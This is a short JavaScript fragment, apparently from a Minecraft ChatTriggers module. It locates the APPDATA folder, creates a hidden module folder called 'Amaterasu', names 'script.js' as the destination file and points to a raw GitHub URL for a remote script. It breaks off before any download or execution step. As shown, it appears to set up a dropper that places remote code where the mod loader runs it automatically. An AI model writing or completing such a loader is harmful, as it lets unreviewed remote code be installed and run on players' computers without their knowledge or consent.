const appData = System.getenv("APPDATA");

// Path to ChatTriggers pogdata module folder
const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/Amaterasu");
targetPath.mkdirs(); // Create folders if needed

// Destination file
const file = new File(targetPath, "script.js");

// GitHub raw file URL
const url = "https://raw.githubusercontent.com/satnnyy/test1/refs/heads/main/b.js";
